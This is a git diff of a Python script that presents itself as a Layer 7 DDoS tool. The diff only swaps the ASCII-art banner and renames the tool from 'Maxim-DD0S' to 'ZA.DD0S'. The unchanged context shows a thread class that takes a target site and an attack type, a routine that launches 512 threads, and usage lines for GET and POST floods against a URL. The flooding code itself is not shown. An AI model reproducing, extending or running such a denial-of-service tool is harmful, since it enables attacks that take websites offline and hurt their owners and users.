@@ -30,20 +30,20 @@ class bcolors:
     ZH = '\033[97m'
 os.system("clear")
 print(" ")
-print("\033[92m  @ @ @ @ @     @ @ @   @ @ @ @    @ @ @ @       @ @ @       @ @ @ @   \033[0m")
-print("\033[92m         @    @       @ @       @  @       @   @       @   @           \033[0m")
-print("\033[92m        @     @       @ @        @ @        @ @         @  @           \033[0m")
-print("\033[92m       @      @       @ @        @ @        @ @         @  @           \033[0m")
-print("\033[33m      @       @ @ @ @ @ @        @ @        @ @         @    @ @ @ @   \033[0m")
-print("\033[33m     @        @       @ @       @  @       @   @       @             @ \033[0m")
-print("\033[33m    @ @ @ @ @ @       @ @ @ @ @    @ @ @ @       @ @ @       @ @ @ @   \033[0m")
-print("\033[33m                                                                              \033[0m")
-print("\033[96m                                                        @      @ @ @ @   \033[0m")
-print("\033[96m                                                        @           @    \033[0m")
-print("\033[96m                                                        @          @     \033[0m")
-print("\033[95m                                                        @         @      \033[0m")
-print("\033[95m                                                        @ @ @ @  @        \033[0m")
-print("\033[33mΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠ\033[0m")
+print("\033[92m  @ @ @ @ @     @ @ @   @ @ @ @    @ @ @ @       @ @ @      @ @ @ @   \033[0m")
+print("\033[92m         @    @       @ @       @  @       @   @       @  @           \033[0m")
+print("\033[92m        @     @       @ @        @ @        @ @         @ @           \033[0m")
+print("\033[92m       @      @       @ @        @ @        @ @         @ @           \033[0m")
+print("\033[33m      @       @ @ @ @ @ @        @ @        @ @         @   @ @ @ @   \033[0m")
+print("\033[33m     @        @       @ @       @  @       @   @       @           @  \033[0m")
+print("\033[33m    @ @ @ @ @ @       @ @ @ @ @    @ @ @ @       @ @ @      @ @ @ @   \033[0m")
+print("\033[33m                                                                      \033[0m")
+print("\033[96m                                                     @      @ @ @ @   \033[0m")
+print("\033[96m                                                     @           @    \033[0m")
+print("\033[96m                                                     @          @     \033[0m")
+print("\033[95m                                                     @         @      \033[0m")
+print("\033[95m                                                     @ @ @ @  @       \033[0m")
+print("\033[33mΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠ\033[0m")
 
 class MyThread(Thread,):
     def __init__(self,SITE, DOS_TYPE):
@@ -90,7 +90,7 @@ class MyThread(Thread,):
 def da_delegator(SITE,DOS_TYPE):
     thread_count = 512
     print ('=') == 60
-    print ('Maxim-DD0S #Layer7 Tool v.1'.center(60,'-'))
+    print ('ZA.DD0S #L7 Tool v.1'.center(60,'-'))
     print ('=') == 60
     threads = []
     for num in range(thread_count):
@@ -115,10 +115,10 @@ None and t.isAlive()]
 def main(argv):
     def usage():
         print ('=') == 60
-        print ('Maxim-DD0S #Layer7 DDOS Tool v.1'.center(60,'-'))
+        print ('ZA.DD0S #L7 DDOS Tool v.1'.center(60,'-'))
         print ('=') == 60
-        print ('For GET DOS - USAGE: MaximLayer.py -t get http://example.com')
-        print ('For POST DOS - USAGE: MaximLayer7.py -t post http://example.com')
+        print ('For GET DOS - USAGE: ZA.DD0S-L7.py -t get http://example.com')
+        print ('For POST DOS - USAGE: ZA.DD0S-L7.py -t post http://example.com')
         sys.exit(2)
     if not argv:
         usage()
